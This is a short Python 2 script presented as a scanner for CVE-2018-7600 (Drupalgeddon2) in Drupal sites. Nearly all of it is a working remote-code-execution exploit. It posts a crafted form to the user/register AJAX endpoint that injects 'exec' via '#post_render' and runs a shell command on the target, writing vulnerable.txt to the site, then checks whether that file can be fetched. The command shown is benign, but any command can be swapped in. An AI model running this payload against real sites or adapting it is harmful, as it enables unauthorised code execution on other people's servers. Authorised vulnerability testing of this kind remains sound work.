#!/usr/bin/python2.7

B = '\033[34m'
G = '\033[32m'
R = '\033[31m'
Y = '\033[93m'
N = '\033[0m'

exploit_banner = '''
{R}CVE-2018-7600 exploit vulnerability scanner{N}
author  : charlie castillon
github  : https://github.com/SecurityVulnerability
license : General Public License GNU v3
'''.format(G=G, N=N, R=R)

usage = '''
{R}CVE-2018-7600 exploit vulnerability scanner{N}
author  : charlie castillon
github  : https://github.com/SecurityVulnerability
license : General Public License GNU v3

usage: python2 CVE-7600-2018-Scanner.py http://site.com/
'''.format(G=G, N=N, R=R)

import sys
import requests

def exploit(target):
    print exploit_banner

    '''
    Add proxy support (eg. BURP to analyze HTTP(s) traffic)
    set verify = False if your proxy certificate is self signed
    remember to set proxies both for http and https

    example:
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    verify = False
    '''

    proxies = {}
    verify = False

    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "vulnerable to cve-7600-2018 exploit" | tee vulnerable.txt'}
    url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    print B + '[*]' + N + ' requesting post'
    r = requests.post(url, proxies=proxies, data=payload, verify=verify)
    print B + '[*]' + N + ' scanning vulnerability'
    try:
        scan = requests.get(target + 'vulnerable.txt')
        if scan.status_code != 200:
           print R + '[-]' + N + ' not vulnerable to cve-2018-7600 exploit \n'
        if scan.status_code == 200:
           print G + '[+]' + N + ' vulnerable to cve-2018-7600 exploit'
           print ' | url: ' + target + 'vulnerable.txt \n'
    except requests.ConnectionError:
        print B + '[*]' + N + ' target connection timeout'


if __name__ == '__main__':
   if len(sys.argv) < 2:
      print usage
   else:
      exploit(sys.argv[1])